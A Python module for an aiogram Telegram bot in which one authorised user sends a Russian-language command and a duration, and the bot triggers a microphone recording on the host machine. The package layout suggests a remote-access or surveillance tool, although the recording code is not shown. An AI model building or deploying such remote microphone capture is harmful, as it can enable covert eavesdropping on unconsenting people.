##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from config import ALLOWED_USER_ID, directory
from lib.Access.Audio.recordmic import start_audio_recording
from aiogram.fsm.state import State, StatesGroup

class microfonetime(StatesGroup):
    waiting_for_microtime = State()
    waiting_for_retry = State()  

def register_audio_handlers(dp):
    @dp.message(F.text.lower() == "запись аудио")
    @dp.message(Command("audio_record"))
    async def audio_record(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            await message.answer("Укажите длительность записи в секундах")
            await state.set_state(microfonetime.waiting_for_microtime)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")

    @dp.message(microfonetime.waiting_for_microtime)
    async def process_audio_time_input(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            try:
                recording_time = int(message.text)
                await start_audio_recording(message, state, recording_time)
            except ValueError:
                await message.answer("Пожалуйста, укажите правильную длительность в секундах")
                await state.clear()
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")